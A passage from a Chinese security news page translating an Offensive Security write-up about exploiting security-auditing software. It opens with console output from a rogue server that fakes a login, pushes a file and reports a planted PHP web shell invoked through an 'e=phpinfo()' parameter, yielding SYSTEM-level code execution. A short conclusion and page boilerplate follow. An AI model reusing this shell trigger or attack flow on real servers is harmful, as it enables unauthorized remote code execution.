style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;connected by&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'172.16.175.137'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">50542</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">login</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;request</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a username:&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">test</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a password: hacked</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;sending SUCCESS packet</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;send string successful</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a column request</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got http request id:&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">6</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got http request path: lol</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;send string successful</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a filename request</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got http request daterange:&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1</span><span style="color: rgb(0, 0, 0); font-size: 13px;">@</span><span style="color: rgb(0, 0, 0); font-size: 13px;">9 - &nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">23</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(0, 128, 160); font-size: 13px;">59</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(0, 128, 160); font-size: 13px;">59</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got http request id:&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">6</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got http request path: lol</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;successfully sent tag</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;successfully sent&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">file</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">file</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;sent successfully</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;done: http:</span><span style="color: rgb(0, 0, 0); font-size: 13px;">//</span><span style="color: rgb(0, 0, 0); font-size: 13px;">172.16.175.137:</span><span style="color: rgb(0, 128, 160); font-size: 13px;">7778</span><span style="color: rgb(0, 0, 0); font-size: 13px;">/</span><span style="color: rgb(0, 0, 0); font-size: 13px;">offsec.php?</span><span style="color: rgb(0, 128, 128); font-size: 13px;">e</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=phpinfo</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p style="text-align: center;"><img width="690" height="93" alt="实现了NT AUTHORITY\SYSTEM权限的远程代码执行" data-original="http://image.3001.net/images/20170709/14995870209997.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">    </p>
<noscript><img width="690" height="93" alt="实现了NT AUTHORITY\SYSTEM权限的远程代码执行" src="http://image.3001.net/images/20170709/14995870209997.png!small">    </p></noscript>
<h2>总结</h2>
<p>当前，出现较多的是SQL或PHP代码注入的输入性验证漏洞，但是当受信客户端向服务端发起认证请求的过程中同样会存在一些破坏性漏洞，而且，某些安全软件其实也并不安全。</p>
<p><span style="color: rgb(159, 163, 168);"><b>*参考来源：<a href="https://www.offensive-security.com/vulndev/auditing-the-auditor/" rel="nofollow">offensive-security</a>，freebuf小编clouds编译，转载请注明来自FreeBuf.COM</b></span>&nbsp;    </p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/clouds" title="由 clouds 发布" rel="author">
                                            <img src="http://image.3001.net/2016/07/12425433_870161.jpg" width="50" height="50" alt="clouds" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/clouds">clouds</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    168                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">8</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/clouds" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=clouds" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="对安全审计软件的一次安全审计" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/vuls/138911.html" rel="prev">我是如何找一个影响数千职业网站的持续型XSS的</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/web/139811.html" rel="next">“神起”僵尸网络的诱捕与反击（上）</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                <div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">2</span> 条评论
      </div>
      <ul>
         <li class="comment byuser comment-author-sec302 even thread-even depth-1" id="li-comment-223651">
    <div id="comment-223651">
        <div class="photo"> <a href="http://www.freebuf.com/author/sec302">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/sec302" target="_blank">sec302&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-07-12</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-223651','223651', 'respond','139719' ) " href="?replytocom=223651#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>思路还行，就是这个硬生生翻译过来的文笔看着真心难受。</p>
<div class="comment-tools">
<div class="vote" id="vote-223651"><span id="acv_stat_223651"></span><a class="ilike_icon"  id="vote4-223651" href="javascript:acv_vote(223651,1);">亮了</a>(<span id="cos_support-223651">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="223651" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="223651" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="223651" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="223651" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="223651" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-wilsonlee odd alt thread-odd thread-alt depth-1" id="li-comment-223661">
    <div id="comment-223661">
        <div class="photo"> <a href="http://www.freebuf.com/author/wilsonlee">
    <img src="http://image.3001.net/2016/09/09a8748b2a94bb296ef094e3d529397b.jpeg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/wilsonlee" target="_blank">wilsonlee&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain"> 我一读再读，却不得不承认，青春是一本太仓促的书。 </span>
		<span class="time">&nbsp;2017-07-12</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-223661','223661', 'respond','139719' ) " href="?replytocom=223661#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>&#8230;.</p>
<div class="comment-tools">
<div class="vote" id="vote-223661"><span id="acv_stat_223661"></span><a class="ilike_icon"  id="vote4-223661" href="javascript:acv_vote(223661,1);">亮了</a>(<span id="cos_support-223661">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="223661" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="223661" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="223661" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="223661" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="223661" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/oauth" title="登陆">登陆？</a><a  href="https://account.tophant.com/register.html" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='139719' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="w69a2n" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>            </div>
                    <div class="col-md-3 visible-md-block visible-lg-block">
                <div class="panel panel-default">
                    <div class="author-top">
                         <div class="author-wrap">
                            <div class="author-header"><img src="http://image.3001.net/2016/07/12425433_870161.jpg" width="96" height="96" alt="clouds" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo" />                            </div>
                            <p class="name"><a href="http://www.freebuf.com/author/clouds" title="由 clouds 发布" rel="author">clouds</a><span><a href="http://zhuanlan.freebuf.com" target="_blank"><img src="http://image.3001.net/images/index/column-iden.png" title="专栏作者"></a></span></p>
                            <p class="signature">I am a robot ,do not talk to me ,code to me.</p>
                            <p class="art-com clearfix">
                                <span class="aut-article">
                                    <a href="/author/clouds"target="_blank">
                                        <i>168</i>
                                        <i>文章数</i>
                                    </a>
                                </span>
                                <span class="aut-comment">
                                    <a href="/author/clouds?comment=1" target="_blank">
                                        <i>37</i>
                                        <i>评论数</i>
                                    </a>
                                </span>
                            </p>
                        </div>
                    </div>
                    <div class="author-bottom">
                        <div class="author-wrap">
                            <h3 class="last-title">最近文章</h3>
                            <div class="last-item-wrap">
                                                                        <div class="last-item">
                                            <a href="http://www.freebuf.com/news/147086.html" target="_blank"><span class="point"></span>挖洞经验 | 看我如何利用SAML漏洞实现Uber内部聊天系统未授权登录</a>
                                            <p class="last-time">2017.09.14</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/articles/terminal/145153.html" target="_blank"><span class="point"></span>CovertBand：连“啪啪啪”都能识别的身体运动信息测试</a>
                                            <p class="last-time">2017.08.26</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/sectool/144821.html" target="_blank"><span class="point"></span>Nmap的高级漏洞扫描模块Vulscan</a>
                                            <p class="last-time">2017.08.22</p>
                                        </div>
                                                                </div>
                        </div>

                        <div class="more-wrap">
                            <a href="http://www.freebuf.com/author/clouds" target="_blank" class="btn-new">浏览更多</a>
                        </div>
                    </div>
                </div>
                                <div class="panel panel-default">
                    <div class="read visible-md-block visible-lg-block">
                        <div class="main-tit02">
                            <h3>相关阅读</h3>
                        </div>
                        <ul>
  <li><a href="http://www.freebuf.com/articles/web/139719.html" target="_blank">对安全审计软件的一次安全审计</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/102256.html" target="_blank">工具推荐：Recon-ng，WEB安全探测框架</a></li>
  
  <li><a href="http://www.freebuf.com/vuls/83677.html" target="_blank">RFID安全十大问题与威胁</a></li>
  
  <li><a href="http://www.freebuf.com/articles/terminal/100285.html" target="_blank">一次对支付宝木马的分析溯源之旅</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/120027.html" target="_blank">没时间了，赶紧上车！教你如何在一小时之内加密你的整个数字生活</a></li>
  </ul>                    </div>
                </div>
                <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
                <div class="panel panel-default rec-spe">
                    <div class="main-tit03 colour-blue">
                        <h3>特别推荐</h3>
                    </div>
                                                    <div class="rec-img"><a href="http://www.freebuf.com/ad?id=3" target="_blank"><img
                                            src="http://image.3001.net/2017/05/14a10c5c919d154dddbee79e3a944143-220x150.png" width="220"></a></div>
                                                </div>
                <div id="mar-right">
                    <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
                    <div class="panel panel-default code"><img src="http://image.3001.net/images/new/code.jpg" width="192"
                                                               height="192">
                        <p>关注我们 分享每日精选文章</p>
                    </div>
                </div>
            </div>
                </div>
                    <div class="row marvellous visible-lg-block">
                <h3>不容错过</h3>
                <ul>
                                                <li><a href="http://www.freebuf.com/articles/neopoints/65809.html" rel="bookmark"
                                   title="360谭晓生：我眼中的RSA 2015 &#8211; 改变和信心">360谭晓生：我眼中的RSA 2015 &#8211; 改变和信心</a>
